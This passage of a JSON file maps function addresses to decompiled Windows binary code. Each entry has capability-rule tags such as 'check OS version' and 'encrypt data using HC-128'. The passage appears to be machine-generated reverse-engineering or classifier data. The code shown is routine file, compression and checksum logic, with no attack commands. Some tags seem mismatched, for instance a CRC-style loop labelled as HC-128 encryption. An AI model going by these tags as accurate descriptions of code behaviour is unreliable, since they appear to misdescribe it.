        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00427470(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *arg_10h;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint uVar3;\n    ulong uVar4;\n    uint arg_8h_00;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    arg_10h = in_ECX + 0x70;\n    *(in_ECX + 0x7c) = 0;\n    *(in_ECX + 0x84) = 0;\n    *(in_ECX + 0x80) = 0;\n    *(in_ECX + 0x78) = 0;\n    *arg_10h = 0;\n    *(in_ECX + 0x90) = 0;\n    *(in_ECX + 0x74) = 0;\n    if ((arg_8h != 0) && (arg_8h != -1)) {\n        iVar1 = (**0x462ee8)(*(in_ECX + 4), 0, 0, 1);\n        if (iVar1 == -1) {\n            *(in_ECX + 0x4c) = 0x80000000;\n            *arg_10h = -1;\n            if (arg_ch != 0) {\n                *arg_10h = arg_ch;\n            }\n            *(in_ECX + 0x6c) = 0;\n            (**0x462fc0)(&var_14h);\n            (**0x462fdc)(&var_14h, &var_24h);\n            fcn.00426e20(var_24h, var_20h, &var_1ch, &var_18h);\n            arg_8h_00 = 0;\n            uVar4 = fcn.0042d350(var_24h + 0x2ac18000, (var_20h + -0x19db1de) - (var_24h < 0xd53e8000), 10000000);\n            uVar3 = uVar4 >> 0x20;\n            uVar2 = uVar4;\n            *(in_ECX + 0x5c) = uVar3;\n            *(in_ECX + 100) = uVar3;\n            *(in_ECX + 0x54) = uVar3;\n            *(in_ECX + 0x7c) = arg_8h;\n            *(in_ECX + 0x50) = uVar2;\n            *(in_ECX + 0x58) = uVar2;\n            *(in_ECX + 0x60) = uVar2;\n            *(in_ECX + 0x68) = CONCAT22(var_1ch, var_18h);\n            fcn.0042a75a(arg_8h_00);\n            return;\n        }\n        iVar1 = fcn.00426ea0(arg_8h, in_ECX + 0x4c, arg_10h, in_ECX + 0x50, in_ECX + 0x68);\n        if (iVar1 == 0) {\n            (**0x462ee8)(arg_8h, 0, 0);\n            *(in_ECX + 0x7c) = arg_8h;\n            *(in_ECX + 0x6c) = 1;\n            fcn.0042a75a(iVar1);\n            return;\n        }\n    }\n    fcn.0042a75a(var_24h);\n    return;\n}\n",
        "token_count": 880
    },
    "00427930": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00427930(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int32_t arg_ch;\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    arg_8h = param_1 + 0x94;\n    var_4h = 0;\n    arg_ch = fcn.00427810(arg_8h, 0x4000);\n    while ((arg_ch != 0 && (arg_ch != -1))) {\n        iVar1 = fcn.004272a0(arg_8h, arg_ch);\n        if (iVar1 != arg_ch) {\n            return 0x60000;\n        }\n        var_4h = var_4h + arg_ch;\n        arg_ch = fcn.00427810(arg_8h, 0x4000);\n    }\n    *(param_1 + 0x90) = var_4h;\n    return 0;\n}\n",
        "token_count": 212
    },
    "00428240": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00428240(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    *(in_ECX + 0x7c) = 0;\n    *(in_ECX + 0x84) = 0;\n    *(in_ECX + 0x80) = 0;\n    *(in_ECX + 0x78) = 0;\n    *(in_ECX + 0x70) = 0;\n    *(in_ECX + 0x90) = 0;\n    *(in_ECX + 0x74) = 0;\n    if (arg_8h == 0) {\n        return 0x10000;\n    }\n    arg_8h_00 = (**0x462ecc)(arg_8h, 0x80000000, 1, 0, 3, 0, 0);\n    if (arg_8h_00 == -1) {\n        return 0x200;\n    }\n    iVar1 = fcn.00427470(arg_8h_00, 0);\n    if (iVar1 != 0) {\n        (**0x462ed0)(arg_8h_00);\n        return iVar1;\n    }\n    *(in_ECX + 0x80) = 1;\n    return 0;\n}\n",
        "token_count": 313
    },
    "0042d62e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042d62e(uint arg_8h)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t **arg_8h_00;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00433b40(0x44e4c8, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == NULL) {\n        puVar2 = fcn.0043007c();\n        *puVar2 = 0x16;\n        fcn.00431906();\n        goto code_r0x0042d711;\n    }\n    fcn.0042da41(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar3 = fcn.00434096(arg_8h_00);\n        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n            iVar4 = 0x451330;\n        }\n        else {\n            iVar4 = (uVar3 & 0x1f) * 0x40 + *((uVar3 >> 5) * 4 + 0x464120);\n        }\n        if ((*(iVar4 + 0x24) & 0x7f) == 0) {\n            if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n                iVar4 = 0x451330;\n            }\n            else {\n                iVar4 = (uVar3 & 0x1f) * 0x40 + *((uVar3 >> 5) * 4 + 0x464120);\n            }\n            if ((*(iVar4 + 0x24) & 0x80) == 0) goto code_r0x0042d6e4;\n        }\n        puVar2 = fcn.0043007c();\n        *puVar2 = 0x16;\n        fcn.00431906();\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x0042d6e4:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar3 = fcn.00433d2f(arg_8h_00);\n        }\n        else {\n            uVar3 = **arg_8h_00;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar3;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0042d71a();\ncode_r0x0042d711:\n    fcn.00433b85();\n    return;\n}\n",
        "token_count": 760
    },
    "0042d722": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042d722(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint8_t **arg_8h_00;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00433b40(0x44e4e8, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    if (arg_8h_00 == NULL) {\n        puVar3 = fcn.0043007c();\n        *puVar3 = 0x16;\n        fcn.00431906();\n        goto code_r0x0042d80d;\n    }\n    fcn.0042da41(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar4 = fcn.00434096(arg_8h_00);\n        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n            iVar5 = 0x451330;\n        }\n        else {\n            iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x464120);\n        }\n        if ((*(iVar5 + 0x24) & 0x7f) == 0) {\n            if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n                iVar5 = 0x451330;\n            }\n            else {\n                iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x464120);\n            }\n            if ((*(iVar5 + 0x24) & 0x80) == 0) goto code_r0x0042d7d8;\n        }\n        puVar3 = fcn.0043007c();\n        *puVar3 = 0x16;\n        fcn.00431906();\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x0042d7d8:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar4 = fcn.00431916(*(unaff_EBP + 8), arg_8h_00);\n        }\n        else {\n            uVar2 = *(unaff_EBP + 8);\n            **arg_8h_00 = uVar2;\n            uVar4 = uVar2;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar4;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0042d816();\ncode_r0x0042d80d:\n    fcn.00433b85();\n    return;\n}\n",
        "token_count": 803
    },
    "0040c0b0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040c0b0(uint *param_1)\n\n{\n    uint *puVar1;\n    uchar *arg_8h;\n    int32_t iVar2;\n    uint arg_ch;\n    int32_t **in_FS_OFFSET;\n    uint *var_8h;\n    uint32_t in_stack_00000018;\n    uint var_c14h;\n    uint var_c10h;\n    uint var_c0ch;\n    uint var_c08h;\n    uint var_c04h;\n    uint var_c00h;\n    uint var_bfch;\n    uint var_bf8h;\n    uint var_bf4h;\n    uint var_bd8h;\n    uint var_bd4h;\n    uint var_bcch;\n    uint var_bc8h;\n    uint var_7e0h;\n    uint var_3f8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint arg_ch_00;\n    uint *puVar3;\n    uint32_t noname_3;\n    uint noname_4;\n    uchar *arg_20h;\n    uint in_stack_fffff3e8;\n    uint var_bd4h_2;\n    uint var_bcch_2;\n    uint var_bc8h_2;\n    uchar auStack2020 [1000];\n    uint var_3f8h_2;\n    uchar uStack1016;\n    uchar uStack1015;\n    uint32_t uStack20;\n    int32_t *piStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack12 = 0x43d748;\n    piStack16 = *in_FS_OFFSET;\n    uStack20 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &piStack16;\n    uStack8 = 0;\n    *0x4524cc = 1;\n    fcn.0042a6e0();\n    var_bcch_2._0_2_ = 0x3b;\n    puVar1 = var_8h;\n    if (in_stack_00000018 < 0x10) {\n        puVar1 = &param_1;\n    }\n    arg_8h = fcn.0042d26d(puVar1, &var_bcch_2, &var_bd4h_2);\n    while (arg_8h != NULL) {\n        iVar2 = (**0x462f30)();\n        if (5 < iVar2) {\n            fcn.0042a6e0();\n            fcn.0042a6e0(&var_bc8h_2);\n            iVar2 = (**0x462f30)();\n            if (iVar2 < 0) {\n                var_3f8h_2._0_1_ = 0;\n            }\n            else {\n                var_3f8h_2._0_1_ = *arg_8h;\n                var_3f8h_2._1_1_ = arg_8h[1];\n                var_3f8h_2._2_1_ = arg_8h[2];\n                var_3f8h_2._3_1_ = arg_8h[3];\n                uStack1016 = arg_8h[4];\n                uStack1015 = 0;\n            }\n            arg_20h = arg_8h + 5;\n            puVar1 = &var_bc8h_2;\n            (**0x4630e4)();\n            noname_4 = 0x446e88;\n            puVar3 = &var_3f8h_2;\n            iVar2 = (**0x463068)();\n            if (iVar2 == 0) {\n                noname_3 = puVar3 & 0xffffff00;\n                arg_ch = fcn.0042ad20(0x4452bc);\n                arg_ch_00 = 0x4452bc;\n                fcn.004062a0(0x4452bc, arg_ch);\n                fcn.00414890(&var_bc8h_2, arg_ch_00, arg_ch, noname_3, noname_4, puVar1, arg_20h);\n            }\n            else {\n                (**0x463038)();\n                fcn.00420910(0x14);\n                (**0x463038)();\n                (**0x463038)();\n                fcn.004146c0(arg_8h, auStack2020);\n                fcn.0042a6e0(&stack0xfffff3e8, 0, 0x3c);\n                in_stack_fffff3e8 = 0x3c;\n                (**0x46309c)(&stack0xfffff3e8);\n                fcn.0042a6e0();\n            }\n            fcn.0042a6e0();\n            fcn.0042a6e0(&var_3f8h_2);\n            fcn.0042a6e0(&var_bc8h_2, 0, 1000);\n            arg_8h = fcn.0042d26d(0, &var_bcch_2, &var_bd4h_2);\n        }\n    }\n    *0x4524d4 = 1;\n    if (0xf < in_stack_00000018) {\n        fcn.0042a679();\n    }\n    *in_FS_OFFSET = piStack16;\n    fcn.0042a75a(in_stack_fffff3e8);\n    return;\n}\n",
        "token_count": 1220
    },
    "0040ed30": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040ed30(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uchar auStackY125016 [4];\n    uint uStackY125012;\n    uchar auStackY125008 [50000];\n    uchar auStackY75008 [50000];\n    uchar auStackY25008 [20000];\n    uint var_138ch;\n    uint uStackY76;\n    uchar *puStackY72;\n    uint uStackY68;\n    uint uStackY64;\n    uchar *puStackY60;\n    uint uStackY56;\n    uint uStackY52;\n    uint *puStackY48;\n    uint uStackY44;\n    uint uStackY40;\n    uint var_4h;\n    \n    fcn.0042bc40();\n    uStackY125012 = 0;\n    fcn.0042a6e0();\n    uStackY40 = 0x40ed85;\n    fcn.0042a6e0();\n    uStackY40 = 5000;\n    puStackY48 = &fcn.0040ed30::var_138ch;\n    uStackY44 = 0;\n    uStackY52 = 0x40ed98;\n    fcn.0042a6e0();\n    uStackY52 = 50000;\n    puStackY60 = &stack0xfffe17b0;\n    uStackY56 = 0;\n    uStackY64 = 0x40edab;\n    fcn.0042a6e0();\n    uStackY64 = 15000;\n    puStackY72 = &stack0xffff9e50;\n    uStackY68 = 0;\n    uStackY76 = 0x40edbe;\n    fcn.0042a6e0();\n    (**0x463038)();\n    iVar1 = fcn.0042d26d(&stack0xfffedb00, 0x447034, &stack0xfffe17a8);\n    iVar2 = 1;\n    while (iVar1 != 0) {\n        switch(iVar2) {\n        case 1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 4:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 5:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 6:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        default:\n            iVar2 = iVar2 + 1;\n            uStackY40 = 0x40ef5c;\n            iVar1 = fcn.0042d26d(0, 0x447034, &stack0xfffe17a8);\n        }\n    }\n    fcn.0042a6e0();\n    fcn.0042a75a(unaff_ESI);\n    return;\n}\n",
        "token_count": 739
    },
    "00406fe0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00406fe0(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint8_t **arg_1ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uchar *puVar16;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint8_t *var_8h;\n    uint8_t *var_4h;\n    \n    var_4h = *arg_1ch;\n    var_8h = arg_1ch[1];\n    uVar15 = *(arg_18h + 0x20);\n    uVar6 = *(arg_18h + 0x1c);\n    puVar16 = *(arg_18h + 0x34);\n    if (puVar16 < *(arg_18h + 0x30)) {\n        var_ch = *(arg_18h + 0x30) + (-1 - puVar16);\n    }\n    else {\n        var_ch = *(arg_18h + 0x2c) - puVar16;\n    }\n    uVar12 = *(arg_8h * 4 + 0x445310);\n    uVar5 = *(arg_ch * 4 + 0x445310);\n    do {\n        for (; uVar6 < 0x14; uVar6 = uVar6 + 8) {\n            uVar3 = *var_4h;\n            var_8h = var_8h + -1;\n            var_4h = var_4h + 1;\n            uVar15 = uVar15 | uVar3 << (uVar6 & 0x1f);\n        }\n        uVar7 = uVar12 & uVar15;\n        uVar3 = *(arg_10h + uVar7 * 8);\n        uVar14 = uVar3;\n        iVar13 = arg_10h + uVar7 * 8;\n        uVar4 = *(iVar13 + 1);\n        uVar15 = uVar15 >> (uVar4 & 0x1f);\n        if (uVar14 == 0) {\ncode_r0x0040720c:\n            uVar6 = uVar6 - uVar4;\n            *puVar16 = *(iVar13 + 4);\n            puVar16 = puVar16 + 1;\n            var_ch = var_ch + -1;\n        }\n        else {\n            uVar6 = uVar6 - *(iVar13 + 1);\n            while ((uVar3 & 0x10) == 0) {\n                if ((uVar14 & 0x40) != 0) {\n                    if ((uVar14 & 0x20) != 0) {\n                        uVar12 = arg_1ch[1] - var_8h;\n                        if (uVar6 >> 3 < arg_1ch[1] - var_8h) {\n                            uVar12 = uVar6 >> 3;\n                        }\n                        *(arg_18h + 0x20) = uVar15;\n                        *(arg_18h + 0x1c) = uVar6 + uVar12 * -8;\n                        arg_1ch[1] = var_8h + uVar12;\n                        puVar1 = *arg_1ch;\n                        *arg_1ch = var_4h + -uVar12;\n                        arg_1ch[2] = arg_1ch[2] + ((var_4h + -uVar12) - puVar1);\n                        *(arg_18h + 0x34) = puVar16;\n                        return 1;\n                    }\n                    arg_1ch[6] = 0x446be8;\n                    goto code_r0x004072d6;\n                }\n                iVar8 = (*(uVar14 * 4 + 0x445310) & uVar15) + *(iVar13 + 4);\n                uVar3 = *(iVar13 + iVar8 * 8);\n                uVar14 = uVar3;\n                iVar13 = iVar13 + iVar8 * 8;\n                uVar4 = *(iVar13 + 1);\n                uVar15 = uVar15 >> (uVar4 & 0x1f);\n                if (uVar14 == 0) goto code_r0x0040720c;\n                uVar6 = uVar6 - *(iVar13 + 1);\n            }\n            uVar14 = uVar14 & 0xf;\n            uVar7 = (*(uVar14 * 4 + 0x445310) & uVar15) + *(iVar13 + 4);\n            uVar15 = uVar15 >> uVar14;\n            for (uVar6 = uVar6 - uVar14; uVar6 < 0xf; uVar6 = uVar6 + 8) {\n                uVar3 = *var_4h;\n                var_8h = var_8h + -1;\n                var_4h = var_4h + 1;\n                uVar15 = uVar15 | uVar3 << (uVar6 & 0x1f);\n            }\n            puVar1 = arg_14h + (uVar5 & uVar15) * 8;\n            uVar15 = uVar15 >> (puVar1[1] & 0x1f);\n            uVar6 = uVar6 - puVar1[1];\n            uVar3 = *puVar1;\n            while ((uVar3 & 0x10) == 0) {\n                if ((uVar3 & 0x40) != 0) {\n                    arg_1ch[6] = 0x446c04;\ncode_r0x004072d6:\n                    uVar12 = arg_1ch[1] - var_8h;\n                    if (uVar6 >> 3 < arg_1ch[1] - var_8h) {\n                        uVar12 = uVar6 >> 3;\n                    }\n                    *(arg_18h + 0x20) = uVar15;\n                    *(arg_18h + 0x1c) = uVar6 + uVar12 * -8;\n                    arg_1ch[1] = var_8h + uVar12;\n                    puVar1 = *arg_1ch;\n                    *arg_1ch = var_4h + -uVar12;\n                    arg_1ch[2] = arg_1ch[2] + ((var_4h + -uVar12) - puVar1);\n                    *(arg_18h + 0x34) = puVar16;\n                    return 0xfffffffd;\n                }\n                iVar13 = (*(uVar3 * 4 + 0x445310) & uVar15) + *(puVar1 + 4);\n                puVar2 = puVar1 + iVar13 * 8 + 1;\n                puVar1 = puVar1 + iVar13 * 8;\n                uVar15 = uVar15 >> (*puVar2 & 0x1f);\n                uVar6 = uVar6 - *puVar2;\n                uVar3 = *puVar1;\n            }\n            uVar14 = uVar3 & 0xf;\n            for (; uVar6 < uVar14; uVar6 = uVar6 + 8) {\n                uVar3 = *var_4h;\n                var_8h = var_8h + -1;\n                var_4h = var_4h + 1;\n                uVar15 = uVar15 | uVar3 << (uVar6 & 0x1f);\n            }\n            uVar9 = *(uVar14 * 4 + 0x445310) & uVar15;\n            var_ch = var_ch + -uVar7;\n            uVar15 = uVar15 >> uVar14;\n            uVar6 = uVar6 - uVar14;\n            puVar11 = *(arg_18h + 0x28);\n            puVar10 = puVar16 + -(uVar9 + *(puVar1 + 4));\n            if (puVar10 < puVar11) {\n                do {\n                    puVar10 = puVar10 + (*(arg_18h + 0x2c) - puVar11);\n                } while (puVar10 < puVar11);\n                arg_8h = *(arg_18h + 0x2c) - puVar10;\n                if (arg_8h < uVar7) {\n                    iVar13 = uVar7 - arg_8h;\n                    do {\n                        *puVar16 = *puVar10;\n                        puVar16 = puVar16 + 1;\n                        puVar10 = puVar10 + 1;\n                        arg_8h = arg_8h - 1;\n                    } while (arg_8h != 0);\n                    puVar11 = *(arg_18h + 0x28);\n                    do {\n                        *puVar16 = *puVar11;\n                        puVar16 = puVar16 + 1;\n                        puVar11 = puVar11 + 1;\n                        iVar13 = iVar13 + -1;\n                    } while (iVar13 != 0);\n                }\n                else {\n                    *puVar16 = *puVar10;\n                    puVar16[1] = puVar10[1];\n                    puVar16 = puVar16 + 2;\n                    puVar10 = puVar10 + 2;\n                    iVar13 = uVar7 - 2;\n                    do {\n                        *puVar16 = *puVar10;\n                        puVar16 = puVar16 + 1;\n                        puVar10 = puVar10 + 1;\n                        iVar13 = iVar13 + -1;\n                    } while (iVar13 != 0);\n                }\n            }\n            else {\n                *puVar16 = *puVar10;\n                puVar16[1] = puVar10[1];\n                puVar16 = puVar16 + 2;\n                puVar10 = puVar10 + 2;\n                iVar13 = uVar7 - 2;\n                do {\n                    *puVar16 = *puVar10;\n                    puVar16 = puVar16 + 1;\n                    puVar10 = puVar10 + 1;\n                    iVar13 = iVar13 + -1;\n                } while (iVar13 != 0);\n            }\n        }\n        if ((var_ch < 0x102) || (var_8h < 0xa)) {\n            uVar12 = arg_1ch[1] - var_8h;\n            if (uVar6 >> 3 < arg_1ch[1] - var_8h) {\n                uVar12 = uVar6 >> 3;\n            }\n            *(arg_18h + 0x20) = uVar15;\n            *(arg_18h + 0x1c) = uVar6 + uVar12 * -8;\n            arg_1ch[1] = var_8h + uVar12;\n            puVar1 = *arg_1ch;\n            *arg_1ch = var_4h + -uVar12;\n            arg_1ch[2] = arg_1ch[2] + ((var_4h + -uVar12) - puVar1);\n            *(arg_18h + 0x34) = puVar16;\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 2628
    },
    "00425af0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425af0(int32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = *(arg_ch + 2);\n    iVar4 = 0;\n    var_4h = 0xffffffff;\n    iVar3 = 7;\n    iVar7 = 4;\n    if (uVar2 == 0) {\n        iVar3 = 0x8a;\n        iVar7 = 3;\n    }\n    *(arg_ch + 6 + arg_10h * 4) = 0xffff;\n    if (-1 < arg_10h) {\n        arg_ch = arg_ch + 6;\n        arg_10h = arg_10h + 1;\n        uVar5 = uVar2;\n        do {\n            uVar6 = *arg_ch;\n            iVar4 = iVar4 + 1;\n            if ((iVar3 <= iVar4) || (uVar5 != uVar6)) {\n                if (iVar4 < iVar7) {\n                    piVar1 = arg_8h + 0xef4 + uVar5 * 4;\n                    *piVar1 = *piVar1 + iVar4;\n                }\n                else if (uVar5 == 0) {\n                    if (iVar4 < 0xb) {\n                        *(arg_8h + 0xf38) = *(arg_8h + 0xf38) + 1;\n                    }\n                    else {\n                        *(arg_8h + 0xf3c) = *(arg_8h + 0xf3c) + 1;\n                    }\n                }\n                else {\n                    if (uVar5 != var_4h) {\n                        piVar1 = arg_8h + 0xef4 + uVar5 * 4;\n                        *piVar1 = *piVar1 + 1;\n                    }\n                    *(arg_8h + 0xf34) = *(arg_8h + 0xf34) + 1;\n                }\n                iVar4 = 0;\n                var_4h = uVar5;\n                if (uVar6 == 0) {\n                    iVar3 = 0x8a;\n                    iVar7 = 3;\n                }\n                else if (uVar5 == uVar6) {\n                    iVar3 = 6;\n                    iVar7 = 3;\n                }\n                else {\n                    iVar3 = 7;\n                    iVar7 = 4;\n                }\n            }\n            arg_ch = arg_ch + 2;\n            arg_10h = arg_10h + -1;\n            uVar5 = uVar6;\n        } while (arg_10h != 0);\n    }\n    return;\n}\n",
        "token_count": 656
    },
    "00427c90": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427c90(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint arg_10h_00;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = 7;\n    iVar2 = 4;\n    if (*(arg_ch + 2) == 0) {\n        iVar1 = 0x8a;\n        iVar2 = 3;\n    }\n    if (-1 < arg_10h) {\n        puVar3 = arg_ch + 6;\n        var_8h = arg_10h + 1;\n        iVar5 = 0;\n        uVar7 = *(arg_ch + 2);\n        do {\n            uVar4 = *puVar3;\n            iVar6 = iVar5 + 1;\n            if ((iVar1 <= iVar6) || (uVar7 != uVar4)) {\n                if (iVar6 < iVar2) {\n                    do {\n                        fcn.00425e40(arg_8h, *(arg_8h + 0xef4 + uVar7 * 4), *(arg_8h + 0xef6 + uVar7 * 4));\n                        iVar6 = iVar6 + -1;\n                    } while (iVar6 != 0);\n                }\n                else {\n                    if (uVar7 == 0) {\n                        if (iVar6 < 0xb) {\n                            fcn.00425e40(arg_8h, *(arg_8h + 0xf38), *(arg_8h + 0xf3a));\n                            arg_10h_00 = 3;\n                            iVar6 = iVar5 + -2;\n                        }\n                        else {\n                            fcn.00425e40(arg_8h, *(arg_8h + 0xf3c), *(arg_8h + 0xf3e));\n                            arg_10h_00 = 7;\n                            iVar6 = iVar5 + -10;\n                        }\n                    }\n                    else {\n                        if (uVar7 != var_4h) {\n                            fcn.00425e40(arg_8h, *(arg_8h + 0xef4 + uVar7 * 4), *(arg_8h + 0xef6 + uVar7 * 4));\n                            iVar6 = iVar5;\n                        }\n                        fcn.00425e40(arg_8h, *(arg_8h + 0xf34), *(arg_8h + 0xf36));\n                        arg_10h_00 = 2;\n                        iVar6 = iVar6 + -3;\n                    }\n                    fcn.00425e40(arg_8h, iVar6, arg_10h_00);\n                }\n                iVar6 = 0;\n                var_4h = uVar7;\n                if (uVar4 == 0) {\n                    iVar1 = 0x8a;\n                    iVar2 = 3;\n                }\n                else if (uVar7 == uVar4) {\n                    iVar1 = 6;\n                    iVar2 = 3;\n                }\n                else {\n                    iVar1 = 7;\n                    iVar2 = 4;\n                }\n            }\n            puVar3 = puVar3 + 2;\n            var_8h = var_8h + -1;\n            iVar5 = iVar6;\n            uVar7 = uVar4;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 817
    },
    "00407320": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00407320(uint32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (arg_ch == NULL) {\n        return 0;\n    }\n    arg_8h = ~arg_8h;\n    if (7 < arg_10h) {\n        uVar2 = arg_10h >> 3;\n        do {\n            uVar1 = arg_8h >> 8 ^ *(((*arg_ch ^ arg_8h) & 0xff) * 4 + 0x4466f0);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[1] ^ uVar1) & 0xff) * 4 + 0x4466f0);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[2] ^ uVar1) & 0xff) * 4 + 0x4466f0);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[3] ^ uVar1) & 0xff) * 4 + 0x4466f0);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[4] ^ uVar1) & 0xff) * 4 + 0x4466f0);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[5] ^ uVar1) & 0xff) * 4 + 0x4466f0);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[6] ^ uVar1) & 0xff) * 4 + 0x4466f0);\n            arg_8h = uVar1 >> 8 ^ *(((arg_ch[7] ^ uVar1) & 0xff) * 4 + 0x4466f0);\n            arg_ch = arg_ch + 8;\n            arg_10h = arg_10h - 8;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    for (; arg_10h != 0; arg_10h = arg_10h - 1) {\n        arg_8h = arg_8h >> 8 ^ 